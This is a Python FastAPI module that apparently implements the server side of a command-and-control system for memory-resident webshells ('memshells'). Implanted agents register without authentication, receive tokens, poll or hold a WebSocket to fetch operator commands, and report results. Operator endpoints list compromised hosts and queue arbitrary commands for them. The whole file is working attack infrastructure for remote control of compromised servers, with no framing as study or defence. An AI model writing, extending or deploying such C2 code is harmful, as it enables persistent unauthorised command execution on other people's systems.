"""C2 agent management — handles memshell callbacks that "call home"."""
from __future__ import annotations

import asyncio
import json
import logging
from datetime import datetime, timezone
from typing import Any

from fastapi import APIRouter, Body, Depends, HTTPException, WebSocket, WebSocketDisconnect, status
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession

from ..auth.deps import current_user
from ..db import get_session
from ..models import Agent, AgentCommand, OobToken, User
from ..schemas import AgentOut, AgentRegister, CommandIn, CommandOut
from ..security import create_access_token, decode_token

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/c2", tags=["c2"])

# In-memory command queues keyed by agent_id
_cmd_queues: dict[str, asyncio.Queue[AgentCommand]] = {}


@router.post("/agent/register", response_model=dict[str, str])
async def agent_register(
    body: AgentRegister,
    session: AsyncSession = Depends(get_session),
) -> dict[str, str]:
    """Called by the memshell on first contact — no auth required."""
    agent = Agent(
        framework=body.framework,
        hostname=body.hostname,
        os=body.os,
        meta=body.meta,
        last_seen=datetime.now(timezone.utc),
    )
    if body.token:
        res = await session.execute(select(OobToken.id).where(OobToken.token == body.token))
        agent.token_id = res.scalar_one_or_none()
    session.add(agent)
    await session.commit()
    await session.refresh(agent)
    _cmd_queues[agent.agent_id] = asyncio.Queue()
    jwt = create_access_token(f"agent:{agent.agent_id}", extra={"role": "agent"})
    log.info("Agent registered: %s %s %s", agent.agent_id, body.framework, body.hostname)
    return {"agent_id": agent.agent_id, "access_token": jwt}


@router.post("/agent/heartbeat")
async def agent_heartbeat(
    ws_token: str,
    result: dict[str, Any] | None = Body(default=None),
    session: AsyncSession = Depends(get_session),
) -> dict[str, Any]:
    """Polling heartbeat for agents that can't do WebSocket (e.g. old filters)."""
    payload = decode_token(ws_token)
    if not payload or not payload.get("sub", "").startswith("agent:"):
        raise HTTPException(status.HTTP_401_UNAUTHORIZED, "invalid agent token")
    agent_id = payload["sub"].split(":", 1)[1]

    res = await session.execute(select(Agent).where(Agent.agent_id == agent_id))
    agent = res.scalar_one_or_none()
    if not agent:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "agent not found")
    agent.last_seen = datetime.now(timezone.utc)

    # Deliver pending result if provided
    if result and result.get("cmd_id"):
        cmd = await session.get(AgentCommand, int(result["cmd_id"]))
        if cmd and cmd.agent_id == agent_id:
            cmd.status = "done"
            cmd.result = result.get("output", "")

    await session.commit()

    # Recreate queue if backend restarted (in-memory state lost)
    if agent_id not in _cmd_queues:
        _cmd_queues[agent_id] = asyncio.Queue()
        # Re-enqueue any pending commands from DB so they aren't lost
        pending_res = await session.execute(
            select(AgentCommand)
            .where(AgentCommand.agent_id == agent_id, AgentCommand.status == "pending")
            .order_by(AgentCommand.id)
        )
        for pending_cmd in pending_res.scalars():
            await _cmd_queues[agent_id].put(pending_cmd)

    # Return next pending command
    q = _cmd_queues[agent_id]
    cmd_payload: dict | None = None
    try:
        cmd_obj = q.get_nowait()
        cmd_payload = {"cmd_id": cmd_obj.id, "cmd": cmd_obj.cmd}
    except asyncio.QueueEmpty:
        pass
    return {"cmd": cmd_payload}


@router.websocket("/agent/ws")
async def agent_ws(ws: WebSocket, session: AsyncSession = Depends(get_session)) -> None:
    """WebSocket channel for agents that support persistent connections."""
    await ws.accept()
    raw = await ws.receive_text()
    try:
        msg = json.loads(raw)
    except json.JSONDecodeError:
        await ws.close(4400)
        return
    payload = decode_token(msg.get("token", ""))
    if not payload or not payload.get("sub", "").startswith("agent:"):
        await ws.close(4401)
        return
    agent_id = payload["sub"].split(":", 1)[1]
    if agent_id not in _cmd_queues:
        _cmd_queues[agent_id] = asyncio.Queue()
    q = _cmd_queues[agent_id]

    async def _recv_loop() -> None:
        while True:
            try:
                cmd_obj = await q.get()
                await ws.send_text(json.dumps({"cmd_id": cmd_obj.id, "cmd": cmd_obj.cmd}))
            except Exception:
                break

    recv_task = asyncio.get_running_loop().create_task(_recv_loop())
    try:
        while True:
            raw = await ws.receive_text()
            data = json.loads(raw)
            if data.get("type") == "result":
                cmd = await session.get(AgentCommand, int(data.get("cmd_id", 0)))
                if cmd and cmd.agent_id == agent_id:
                    cmd.status = "done"
                    cmd.result = data.get("output", "")
                    await session.commit()
            elif data.get("type") == "heartbeat":
                res = await session.execute(select(Agent).where(Agent.agent_id == agent_id))
                ag = res.scalar_one_or_none()
                if ag:
                    ag.last_seen = datetime.now(timezone.utc)
                    await session.commit()
    except WebSocketDisconnect:
        pass
    finally:
        recv_task.cancel()


# ── Operator-facing endpoints ────────────────────────────────────────────────

@router.get("/agents", response_model=list[AgentOut])
async def list_agents(
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> list[Agent]:
    res = await session.execute(select(Agent).order_by(Agent.last_seen.desc()))
    return list(res.scalars())


@router.post("/agents/{agent_id}/cmd", response_model=CommandOut)
async def send_command(
    agent_id: str,
    body: CommandIn,
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> AgentCommand:
    res = await session.execute(select(Agent).where(Agent.agent_id == agent_id))
    agent = res.scalar_one_or_none()
    if not agent:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "agent not found")
    cmd = AgentCommand(agent_id=agent_id, cmd=body.cmd, status="pending")
    session.add(cmd)
    await session.commit()
    await session.refresh(cmd)
    q = _cmd_queues.get(agent_id)
    if q:
        await q.put(cmd)
    return cmd


@router.get("/agents/{agent_id}/commands", response_model=list[CommandOut])
async def list_commands(
    agent_id: str,
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> list[AgentCommand]:
    res = await session.execute(
        select(AgentCommand).where(AgentCommand.agent_id == agent_id).order_by(AgentCommand.id.desc()).limit(100)
    )
    return list(res.scalars())
